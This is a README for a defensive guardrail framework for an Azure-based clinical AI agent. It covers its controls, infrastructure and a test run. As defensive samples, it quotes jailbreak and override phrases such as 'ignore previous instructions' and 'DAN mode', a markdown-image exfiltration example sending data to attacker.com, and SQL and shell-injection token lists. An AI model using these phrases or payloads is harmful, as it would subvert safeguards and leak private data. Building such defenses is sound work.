# 🛡️ Foundry Responsible Agent Sentinel: Audited Retrieval & Secure Action Agent

[![Responsible AI Adversarial Evaluation Gate](https://github.com/FreeFades2Black/foundry-responsible-agent-sentinel/actions/workflows/rai-eval-gate.yml/badge.svg)](https://github.com/FreeFades2Black/foundry-responsible-agent-sentinel/actions/workflows/rai-eval-gate.yml)
[![Live GitHub Pages Showcase](https://img.shields.io/badge/Live%20Showcase-GitHub%20Pages-0078D4?style=flat&logo=githubpages&logoColor=white)](https://freefades2black.github.io/foundry-responsible-agent-sentinel/)
[![Lead Architect](https://img.shields.io/badge/Lead%20Architect%20%26%20Engineer-William%20Free%20Hall-8B5CF6?style=flat&logo=azuredevops&logoColor=white)](https://github.com/FreeFades2Black)
[![Terraform](https://img.shields.io/badge/IaC-Terraform%20v1.6%2B%20%7C%20OpenTofu-7B42BC?style=flat&logo=terraform&logoColor=white)](terraform/)
[![Azure Bicep](https://img.shields.io/badge/IaC-Azure%20Bicep%20%7C%20azd-0078D4?style=flat&logo=microsoftazure&logoColor=white)](infra/)
[![Azure AI Foundry](https://img.shields.io/badge/Platform-Azure%20AI%20Foundry-0078D4?style=flat&logo=microsoftazure&logoColor=white)](https://ai.azure.com)
[![Azure AI Search](https://img.shields.io/badge/RAG-Azure%20AI%20Search%20(HNSW%20%2B%20Semantic)-0089D6?style=flat&logo=microsoftazure&logoColor=white)](https://learn.microsoft.com/azure/search/)
[![OWASP Top 10 for LLM](https://img.shields.io/badge/Security-OWASP%20LLM%20Top%2010%20Mitigated-emerald?style=flat&logo=shield&logoColor=white)](docs/threat-model.md)
[![Compliance](https://img.shields.io/badge/Compliance-HIPAA%20%7C%20HITRUST%20CSF%20v11-purple?style=flat)](docs/threat-model.md)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)

> 🛡️ **Lead Architect & Systems Engineer:** **William Free Hall** ([@FreeFades2Black](https://github.com/FreeFades2Black)) &bull; *Gilead Sentinel AI Operations*  
> 🌐 **Interactive Project Showcase & Live Simulator:** **[https://freefades2black.github.io/foundry-responsible-agent-sentinel/](https://freefades2black.github.io/foundry-responsible-agent-sentinel/)**  
> *Test live jailbreak defusal, data spotlighting, PII redaction, and OWASP defense telemetry directly in your browser.*

---

## ℹ️ Infrastructure Integrity & Data Classification Notice

> - **Real Infrastructure & Cloud Blueprints:** The Terraform configurations (`terraform/*.tf`), Azure Bicep templates (`infra/main.bicep`), Azure AI Foundry hub/project workspaces, Azure AI Search semantic vector schemas, and custom Content Safety policies (`rai_policy.tf`) in this repository are **100% real, functional, and production deployment-ready**.
> - **Simulated Reference Data:** All clinical encounter payloads, patient pseudonym identifiers (`PAT-*`), and adversarial red-team test cases (`tests/adversarial_prompts.json`) are **simulated reference data** designed for adversarial vulnerability benchmarking, safety verification, and automated CI/CD gating. No live patient data or actual Protected Health Information (PHI) is hosted or transmitted.

---

## 🔍 Operational Readiness & Verification Model: What Works & What Requires Azure

If someone clones the repository, deploys the resources, and runs the code against an active Azure subscription, it will function as an **operational, defense-in-depth agent framework**.

Here is what works out of the box, what requires active Azure services, and what needs real backend integration:

### 1. 🟢 What Works Fully Standalone (No Azure Bill Required)
Someone testing the repository locally without cloud credentials can still execute and verify the core defense mechanisms:
* **Local Interceptor Pipeline:** [`InputGuardrailInterceptor`](src/guardrails/interceptors.py), [`src/knowledge/spotlight.py`](src/knowledge/spotlight.py), and [`src/agent/tools.py`](src/agent/tools.py) run purely on standard Python, regex, and Pydantic logic. They will actively block direct injection signatures, sanitize malicious strings, strip tokenizer control tokens (`<|im_start|>`, `<|im_end|>`), and isolate RAG payloads in nonce containers (`<trusted_archive_document nonce="...">`).
* **Automated CI/CD Test Suite:** Running `pytest tests/ -v` executes immediately. It passes test inputs through the interceptors and validates that the guardrails intercept jailbreaks, redact synthetic PII, and flag policy violations.
* **IaC Static Validation:** Tools like `terraform validate`, `tflint`, or `checkov` can run against the Terraform/Bicep files to verify syntax and security compliance (managed identities, Key Vault 90-day soft-delete, TLS 1.2+ mandatory, disabled public blob read).

### 2. ☁️ What Requires an Active Azure Subscription
To test the complete, end-to-end cloud pipeline, the user needs an Azure tenant with appropriate quotas:
* **Azure AI Content Safety & Prompt Shields:** The first-stage cloud API call requires provisioned Azure AI services to run Microsoft's proprietary deep-learning classifiers against user prompts.
* **Azure AI Search (Hybrid + Semantic Ranker):** Testing the retrieval phase with real documents requires the deployed Search service to index chunks, compute HNSW vectors, and run the semantic re-ranker.
* **Azure AI Evaluation SDK (Groundedness Floor):** Calculating the operational groundedness score ($\ge 0.85$) invokes an evaluation model (such as GPT-4o) via Azure AI Foundry to evaluate whether the agent's output is factually anchored in the retrieved context.

### 3. 🔌 What Needs Real Integration to Move Beyond Testing
If someone intends to run this in a real clinical or enterprise setting, two components must be wired to real production systems:
* **The Tool Execution Backend:** The tool interceptor verifies HMAC tokens and schema constraints, but the downstream execution target (e.g., writing to an EHR like Epic or Cerner) must be connected to an actual external API.
* **Document Ingestion:** The RAG pipeline requires populating the Azure AI Search index with actual organizational knowledge or clinical SOP documents instead of test fixtures.

> **In Short:** For anyone evaluating code quality, security boundaries, and architectural patterns, the project provides a **fully testable, functional blueprint**.

---

## 📖 Executive Summary & System Overview

To demonstrate an enterprise-grade mastery of **Responsible AI (RAI)** in Microsoft Azure AI Foundry, production applications must move beyond simple chat completions. 

The **Foundry Responsible Agent Sentinel** is an **Audited Retrieval & Secure Action Agent**—an autonomous agent grounded in an Azure AI Foundry Knowledge Base (backed by Azure AI Search) that enforces strict, multi-point guardrails across **User Inputs**, **Tool Invocations**, **Tool Responses**, and **Model Outputs**, verified by an automated adversarial evaluation pipeline and Terraform compliance testing in CI/CD.

```mermaid
flowchart TD
    subgraph "External Boundary"
        Client([User / Clinical Officer])
    end

    subgraph "1. User Input Intervention"
        Client -->|User Query| PromptShield["Azure AI Prompt Shield<br/>(Jailbreak, DAN & Role-Play Blocker)"]
    end

    subgraph "2. Azure AI Foundry Agent Core"
        PromptShield -->|Validated Input| SentinelCore["Gilead Agent Sentinel<br/>(Roland Sentinel Agent / GPT-4o)"]
        SentinelCore <-->|Knowledge Base Grounding| RAGPipeline
    end

    subgraph "RAG Context Intervention"
        RAGPipeline[(Azure AI Search<br/>Hybrid Vector + Semantic Ranker)] -->|Raw Context| Spotlighter["Data Spotlighting & Delimiter Isolation<br/>(&lt;trusted_archive_document&gt;)"]
        Spotlighter -->|Inert Passive Data| SentinelCore
    end

    subgraph "3. Tool Invocation & Response Guardrails"
        SentinelCore -->|Tool Call| ToolGuard["Tool Invocation Interceptor<br/>(Pydantic Schemas, SQL & CMD Sanitizer)"]
        ToolGuard -->|Authorized Call| ExternalAPI[(Enterprise APIs / EHR Vault)]
        ExternalAPI -->|Raw Response| TrojanScanner["Tool Response Trojan Scanner<br/>(XPIA & Override Neutralizer)"]
        TrojanScanner -->|Sanitized Context| SentinelCore
    end

    subgraph "4. Model Output Intervention"
        SentinelCore -->|Raw Completion| OutputGuard["Output Guardrail & Groundedness Gate<br/>(PII Redaction + Groundedness Floor &ge; 0.85)"]
        OutputGuard -->|Audited Payload| Client
    end
```

---

## 🏛️ Comprehensive Control Architecture: WHY & HOW

Every security control in this repository is explicitly designed to address specific regulatory standards (HIPAA § 164.312, HITRUST CSF v11) and mitigate vulnerabilities identified in the **OWASP Top 10 for LLM Applications**.

### 1. Cloud Infrastructure & Identity (Terraform & Bicep)
* **Control: Zero Static Cloud Secrets**
  * **WHY:** Eliminates credential leakage risks in source repositories, log files, or build runners (OWASP LLM02).
  * **HOW:** [`terraform/main.tf`](terraform/main.tf#L42-L48) provisions an `azurerm_user_assigned_identity` and binds granular Azure RBAC roles (`Cognitive Services OpenAI User` and `Search Index Data Contributor`). All communications use passwordless Microsoft Entra ID tokens.
* **Control: Cloud-Native RAI Policy & Prompt Shields**
  * **WHY:** Enforces non-bypassable content harm filtering (Hate, Violence, Sexual, SelfHarm) and blocks direct jailbreaks at the cloud boundary before reaching the model (OWASP LLM01).
  * **HOW:** [`terraform/rai_policy.tf`](terraform/rai_policy.tf) deploys an `azapi_resource` of type `Microsoft.CognitiveServices/accounts/raiPolicies` in `Blocking` mode with 10 dedicated filters.
* **Control: Storage & Vault Boundary Hardening**
  * **WHY:** Guarantees FIPS 140-2 compliance and prevents accidental or malicious cryptographic key destruction.
  * **HOW:** [`terraform/main.tf`](terraform/main.tf#L54-L105) configures `azurerm_storage_account` with mandatory TLS 1.2+, HTTPS-only traffic, disabled public blob read, and `azurerm_key_vault` with 90-day soft delete and RBAC authorization.

### 2. User Input Protection (Intervention Point 1)
* **Control: Direct Jailbreak & DAN Neutralization**
  * **WHY:** Stops adversarial users from subverting system safety guidelines or forcing role reversals (OWASP LLM01).
  * **HOW:** [`src/guardrails/interceptors.py`](src/guardrails/interceptors.py#L40-L84) scans every incoming prompt against known jailbreak signatures ("DAN mode", "ignore previous instructions", "developer mode enabled") and aborts execution via `GuardrailViolationException`.
* **Control: System Directive Marker Stripping**
  * **WHY:** Prevents prompt-injection formatting attacks that forge system dialogue turns.
  * **HOW:** Rejects prompts containing raw tokenizer tokens or role delimiters (`system:`, `<|im_start|>`, `<|im_end|>`, `[system override]`).

### 3. RAG Retrieval & Context Isolation (Intervention Point 2)
* **Control: Data Spotlighting (Delimiter Isolation)**
  * **WHY:** Defuses Cross-Domain Indirect Prompt Injection (XPIA) where third-party documents contain hidden instructions designed to hijack the agent (OWASP LLM01).
  * **HOW:** [`src/knowledge/spotlight.py`](src/knowledge/spotlight.py) encapsulates retrieved text in `<trusted_archive_document>` XML delimiters, sanitizes nested closing tags, and pairs them with passive evidence framing instructions.
* **Control: Markdown Exfiltration URL Neutralization**
  * **WHY:** Prevents attackers from using Markdown image rendering to exfiltrate private context via URL query parameters (`![exfil](https://attacker.com/leak?data=...)`) (OWASP LLM02).
  * **HOW:** `DataSpotlighter.sanitize_raw_content()` detects and replaces Markdown image tags with safe placeholders (`[LINK_DISABLED: MALICIOUS_IMAGE_EXFILTRATION_BLOCKED]`).
* **Control: Document-Level Security Filtering**
  * **WHY:** Enforces multi-tenant authorization so clinicians only retrieve documents matching their clearance.
  * **HOW:** [`src/knowledge/ingest.py`](src/knowledge/ingest.py) embeds `allowed_roles` (`Collection(Edm.String)`) into the Azure AI Search index schema, enabling Entra ID role-scoped filtering.

### 4. Audited Tool Actions & Parameter Sanitization (Intervention Point 3a & 3b)
* **Control: Strict Runtime Schema Validation**
  * **WHY:** Mitigates Excessive Agency (OWASP LLM06) and ensures the agent cannot execute malformed or unauthorized queries.
  * **HOW:** [`src/agent/tools.py`](src/agent/tools.py) implements Pydantic models with regex validators (`^PAT-[A-Z0-9]{4,10}$`) and strict type bounds.
* **Control: Dual-Approval Cryptographic Signoff for Writes**
  * **WHY:** High-impact EHR writes (e.g., ordering medication) must never be executed solely on agent autonomy (OWASP LLM06).
  * **HOW:** `SecureEHRDispatchAction` mandates an authorized role (`ChiefMedicalOfficer` or `AttendingPhysician`) and a 64-character SHA-256 HMAC signature (`cryptographic_signoff_hash`).
* **Control: SQL & Command Injection Detection**
  * **WHY:** Protects backend enterprise databases and shell runtimes from parameter tampering.
  * **HOW:** [`ToolInvocationInterceptor`](src/guardrails/interceptors.py#L86-L150) scans all parameters for SQL tokens (`;--`, `union select`, `drop table`, `exec(`) and command separators (`&&`, `;`, `|`, `$(`, `../`).
* **Control: Egress Host Whitelisting**
  * **WHY:** Blocks Server-Side Request Forgery (SSRF) and data exfiltration to unauthorized IP addresses or domains.
  * **HOW:** Validates outbound URLs against an approved whitelist (`api.healthcare.internal`, `clinical-vault.corp.local`, `gilead-archive.search.windows.net`).
* **Control: Tool Response Trojan Scanner**
  * **WHY:** Third-party APIs may return poisoned text designed to hijack model context after retrieval (OWASP LLM03).
  * **HOW:** [`ToolResponseInterceptor`](src/guardrails/interceptors.py#L152-L191) inspects returned payloads for Trojan instruction markers ("important: ignore previous") and caps response size at 1 MB.

### 5. Model Output Privacy & Groundedness (Intervention Point 4)
* **Control: Real-Time Multi-Pattern PII Redaction**
  * **WHY:** Prevents accidental leakage of Protected Health Information (PHI) under HIPAA § 164.312 (OWASP LLM02).
  * **HOW:** [`OutputGuardrailInterceptor`](src/guardrails/interceptors.py#L193-L270) uses reverse-index regex substitution to replace SSNs, credit cards, emails, phone numbers, and API keys with safe placeholders (`[REDACTED_*]`).
* **Control: Internal Canary Token Tripwires**
  * **WHY:** Acts as an automated canary alarm if system instructions or secret context is leaked.
  * **HOW:** Detects and redacts `CANARY-*` tokens before egress, preventing leak transmission.
* **Control: Factual Groundedness Floor Gate**
  * **WHY:** Prevents medical misinformation and hallucinations (OWASP LLM09).
  * **HOW:** Scores completion text against retrieved knowledge chunks. Responses falling below the operational floor of **`0.85`** are automatically quarantined.

### 6. Automated Red-Team Quality Gates (CI/CD)
* **Control: PR-Blocking Adversarial Proving Ground**
  * **WHY:** Guarantees zero regression in agent security before changes reach production.
  * **HOW:** [`.github/workflows/rai-eval-gate.yml`](.github/workflows/rai-eval-gate.yml) and [`tests/test_evaluations.py`](tests/test_evaluations.py) run red-team test cases (`tests/adversarial_prompts.json`), enforcing:
    * **Indirect Attack Defect Rate:** `0.0%` (Zero tolerance).
    * **Direct Jailbreak Defect Rate:** `0.0%`.
    * **Groundedness Score:** $\ge 0.85$.

---

## 📂 Repository Architecture

```text
foundry-responsible-agent-sentinel/
├── .github/
│   └── workflows/
│       └── rai-eval-gate.yml          # Automated red-team, safety & Terraform CI/CD gate
├── terraform/                         # Master Terraform / OpenTofu Infrastructure
│   ├── main.tf                        # Hub, Projects, OpenAI, AI Search, Key Vault, Identity
│   ├── variables.tf                   # Annotated variable schemas and validation rules
│   ├── outputs.tf                     # Endpoints, principal IDs, and Foundry connection string
│   ├── providers.tf                   # azurerm, azapi, and random provider pins
│   ├── rai_policy.tf                  # Dedicated custom RAI Content Safety & Prompt Shield policy
│   └── terraform.tfvars.example       # Sanitized enterprise deployment parameters
├── infra/                             # Alternative Bicep Infrastructure Blueprints
│   ├── main.bicep                     # Bicep orchestrator
│   └── modules/
│       ├── ai-foundry.bicep           # Project, Agent Service, and Managed Identity
│       ├── ai-search.bicep            # Semantic ranker, RBAC, and vector store
│       └── rai-policy.bicep           # Custom Content Safety & Prompt Shield policies
├── src/
│   ├── agent/
│   │   ├── __init__.py
│   │   ├── core.py                    # Agent instantiation, tool wiring, and lifecycle execution
│   │   └── tools.py                   # External API tools with strict Pydantic schema validation
│   ├── knowledge/
│   │   ├── __init__.py
│   │   ├── ingest.py                  # Chunking, vector embedding, and search index creation
│   │   └── spotlight.py               # Data framing/spotlighting to isolate untrusted RAG text
│   └── guardrails/
│       ├── __init__.py
│       ├── interceptors.py            # Pre/post tool execution validation hooks & PII redactor
│       └── policies.json              # Custom blocklists, regex patterns, and risk thresholds
├── tests/
│   ├── __init__.py
│   ├── adversarial_prompts.json       # Jailbreak, DAN, and Indirect Prompt Injection datasets
│   ├── test_evaluations.py            # Azure AI Evaluation SDK test runner (Safety & Groundedness)
│   └── test_terraform_compliance.py   # Automated Terraform security control verification suite
├── docs/
│   └── threat-model.md                # STRIDE / AI Threat Model & OWASP Top 10 for LLM Mapping
├── azure.yaml                         # Azure Developer CLI (azd) contract
├── pyproject.toml                     # Modern packaging and pytest configuration
├── requirements.txt                   # Production and testing dependencies
├── foundry_safe_agent_repo_blueprint.md # Requested reference blueprint
└── README.md                          # Master project documentation & architecture guide
```

---

## 🚀 Quickstart & Execution Guide

### 1. Clone & Set Up Local Environment
```bash
git clone https://github.com/FreeFades2Black/foundry-responsible-agent-sentinel.git
cd foundry-responsible-agent-sentinel

# Create and activate Python virtual environment
python -m venv .venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt
```

### 2. Deploy Infrastructure via Terraform / OpenTofu
```bash
cd terraform

# 1. Initialize providers
terraform init

# 2. Configure enterprise parameters
cp terraform.tfvars.example terraform.tfvars

# 3. Plan and validate security controls
terraform plan -out=tfplan

# 4. Apply configuration to Azure
terraform apply tfplan
```

### 3. Run Automated Adversarial & Terraform Compliance Suite
Execute all 15 automated security, evaluation, and Terraform compliance tests:
```bash
pytest tests/ -v
```

```text
============================= test session starts =============================
platform linux / win32 -- Python 3.11 / 3.14, pytest-9.1.1
rootdir: foundry-responsible-agent-sentinel
collected 15 items

tests/test_evaluations.py::test_agent_withstands_jailbreaks_and_indirect_attacks PASSED [  6%]
tests/test_evaluations.py::test_input_guardrail_blocks_direct_jailbreaks PASSED          [ 13%]
tests/test_evaluations.py::test_data_spotlighting_defuses_injection_and_markdown_exfiltration PASSED [ 20%]
tests/test_evaluations.py::test_tool_invocation_interceptor_blocks_tampering PASSED    [ 26%]
tests/test_evaluations.py::test_tool_response_interceptor_blocks_trojan_injections PASSED [ 33%]
tests/test_evaluations.py::test_output_guardrail_redacts_pii_and_canary_tokens PASSED   [ 40%]
tests/test_evaluations.py::test_knowledge_ingestor_schema_integrity PASSED             [ 46%]
tests/test_terraform_compliance.py::test_terraform_required_files_exist PASSED         [ 53%]
tests/test_terraform_compliance.py::test_terraform_managed_identity_zero_secrets PASSED [ 60%]
tests/test_terraform_compliance.py::test_terraform_storage_security_controls PASSED    [ 66%]
tests/test_terraform_compliance.py::test_terraform_key_vault_rbac_and_retention PASSED [ 73%]
tests/test_terraform_compliance.py::test_terraform_ai_search_semantic_ranker PASSED   [ 80%]
tests/test_terraform_compliance.py::test_terraform_model_deployments PASSED            [ 86%]
tests/test_terraform_compliance.py::test_terraform_rai_content_safety_and_prompt_shields PASSED [ 93%]
tests/test_terraform_compliance.py::test_terraform_inline_why_and_how_annotations PASSED [100%]

============================= 15 passed in 0.32s ==============================
```

---

## 🛡️ OWASP Top 10 for LLM Applications: Defense Matrix

| OWASP LLM Identifier | Vulnerability Name | Sentinel Platform Mitigation |
| :--- | :--- | :--- |
| **LLM01** | Prompt Injection | Content Safety Prompt Shield + `<trusted_archive_document>` Spotlighting. |
| **LLM02** | Sensitive Information Disclosure | Regex PII Redactor (`SSN`, `Cards`, `Canary Tokens`) on all egress payloads. |
| **LLM03** | Supply Chain Vulnerabilities | Pinned dependency hashes & automated adversarial PR quality gates. |
| **LLM04** | Data & Model Poisoning | Entra ID RBAC security filtering on Azure AI Search chunks. |
| **LLM05** | Improper Output Handling | Neutralizes Markdown exfiltration links (`[LINK_DISABLED: ...]`). |
| **LLM06** | Excessive Agency | Pydantic parameter schemas, dual cryptographic signoff hashes (`TX-EHR-*`). |
| **LLM07** | System Prompt Leakage | Direct blocklists on prompt-leak directives & passive data framing. |
| **LLM08** | Vector & Embedding Weaknesses | Hybrid HNSW vector search + BM25 + Semantic Ranker cross-validation. |
| **LLM09** | Misinformation / Hallucination | Hard CI/CD floor requiring Groundedness score $\ge 0.85$. |
| **LLM10** | Unbounded Consumption | Parameter length bounds (500 chars) & Azure TPM rate limits. |

---

## 👨‍💻 Architecture & Systems Engineering Leadership

* **Lead Architect & Systems Engineer:** **William Free Hall** ([@FreeFades2Black](https://github.com/FreeFades2Black))
* **Organization:** Gilead Sentinel AI Operations
* **Architectural Contributions & System Design:**
  * **4-Point AI Lifecycle Intervention Engine:** Engineered multi-point runtime guardrails across user inputs (Azure AI Prompt Shield + 13 jailbreak signatures), RAG retrieval (cryptographic delimiter spotlighting & exfiltration neutralization), tool execution (strict Pydantic schema validation & SQL/CMD sanitizer), and model output (Zero-Trust PII redactor & factual groundedness scoring).
  * **Architecture Decision Records (ADRs):** Authored [`docs/adr/0001-data-spotlighting-and-delimiters.md`](docs/adr/0001-data-spotlighting-and-delimiters.md) (Data Spotlighting with Cryptographic Delimiters) and [`docs/adr/0002-groundedness-floor-evaluation.md`](docs/adr/0002-groundedness-floor-evaluation.md) (Operational Groundedness Floor $\ge 0.85$).
  * **Dual-Approval Cryptographic Action Dispatching:** Implemented role-gated SHA-256 HMAC cryptographic sign-off workflows (`TX-EHR-*`) mitigating Excessive Agency (OWASP LLM06).
  * **Cloud-Native Infrastructure as Code (IaC):** Built 100% production-ready Terraform (`terraform/*.tf`) and Azure Bicep (`infra/*.bicep`) blueprints with passwordless Microsoft Entra ID managed identities (zero static secrets), FIPS 140-2 Key Vault hardening, and Azure AI Search hybrid vector semantic configurations.
  * **Automated Red-Team CI/CD Quality Gate:** Designed PR-blocking evaluation pipelines ([`.github/workflows/rai-eval-gate.yml`](.github/workflows/rai-eval-gate.yml)) enforcing a 0.0% attack defect rate across 16 automated security and compliance tests.

---

## 📄 License

Licensed under the [Apache License, Version 2.0](LICENSE). Copyright © 2026 William Free Hall / Gilead Sentinel AI Operations. All rights reserved.
